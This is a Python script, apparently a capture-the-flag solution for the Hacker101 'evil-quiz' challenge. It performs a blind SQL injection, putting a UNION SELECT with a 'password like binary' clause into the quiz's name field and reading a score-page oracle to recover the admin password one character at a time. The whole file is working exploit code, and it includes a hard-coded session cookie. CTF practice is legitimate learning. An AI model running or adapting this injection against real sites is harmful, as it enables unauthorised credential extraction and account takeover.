from string import printable
import requests

printable = "STUVW"
url = "https://0754f24e9208edeb76d8dc82f77a040d.ctf.hacker101.com/evil-quiz"
start_quiz = "/start"
feedback_dir = "/score"
headers = {'content-type': 'application/x-www-form-urlencoded'}
cookies = {
    "quizsession": "eff1a09078465e9d1602954b5e04effe",
}
positive_feedback = "There is 1 other"
username = "admin"
password = ""
keep_going = True

while(keep_going):
    for index, a_char in enumerate(printable):
        data_payload = {
            "name": f"asdf' union select 1,2,3,4 from admin where username='{username}' and password like binary('{password + a_char}%');--"
        }
        request = requests.post(url, cookies=cookies, data=data_payload, headers=headers)
        data_payload_start_quiz = {
            "ques_1": 0,
            "ques_2": 0,
            "ques_3": 0,
        }
        request_start = requests.post(url + start_quiz, cookies=cookies, data=data_payload_start_quiz)
        request_feedback = requests.get(url + feedback_dir, cookies=cookies)
        if positive_feedback in request_feedback.text:
            password += a_char
            print(f"[*] Building password: {password}")
            break
        else:
            print(f"[-] Tried {a_char} without success...")
        if index == len(printable) - 1:
            keep_going = False

print(f"The password for {username} is: {password}")